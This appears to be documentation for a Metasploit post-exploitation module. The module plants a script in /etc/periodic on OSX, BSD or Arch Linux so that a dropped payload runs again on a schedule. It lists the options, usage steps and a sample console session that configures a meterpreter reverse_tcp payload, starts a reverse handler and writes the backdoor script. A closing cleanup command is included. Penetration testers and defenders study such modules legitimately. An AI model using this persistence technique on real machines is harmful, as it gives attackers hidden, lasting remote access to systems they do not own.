## Description

This module provides a persistence mechanism on OSX, BSD and Arch Linux 
using periodic scripts. The modules will write a script to `/etc/periodic
/daily/`, `/etc/periodic/weekly/` or `/etc/periodic/monthly/`. This 
script will then execute a payload which is written by default to `/tmp/`.

## Verification Steps

1. Obtain a session with super user privilleges, only the root 
user has write permissions to `/etc/periodic/`
2. Do: `use exploit/multi/local/periodic_script_persistence`
3. Do: `set session #`
4. Do: `set target #`
5. Do: `set payload #`
6. Do: `set verbose true`
7. Do: `expoit`

## Options

### PERIODIC_DIR

Periodic Directory to write script eg. /etc/periodic/daily

### PERIODIC_SCRIPT_NAME

Name of periodic script

### PAYLOAD_DIR

Directory to write payload to

### PAYLOAD_FILENAME

Name of the payload file

## Scenarios
```
msf6 exploit(multi/handler) > use exploit/osx/local/periodic_script_persistence 
[*] No payload configured, defaulting to osx/x64/meterpreter/reverse_tcp
msf6 exploit(osx/local/periodic_script_persistence) > set target 2
target => 2
msf6 exploit(osx/local/periodic_script_persistence) > set session 1
session => 1
msf6 exploit(osx/local/periodic_script_persistence) > set lport 6666
lport => 6666
msf6 exploit(osx/local/periodic_script_persistence) > set payload osx/aarch64/meterpreter_reverse_tcp
payload => osx/aarch64/meterpreter_reverse_tcp
msf6 exploit(osx/local/periodic_script_persistence) > run

[*] Started reverse TCP handler on 192.168.0.239:6666 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] /etc/periodic is writable
[+] The target is vulnerable.
[+] Writing payload to /tmp/q0Y1M6djZ suceeded
[*] Succesfully wrote periodic script to /etc/periodic/daily/JPk5z2s. This will execute /tmp/q0Y1M6djZ
Cleanup script:

sudo rm /tmp/q0Y1M6djZ /etc/periodic/daily/JPk5z2s

```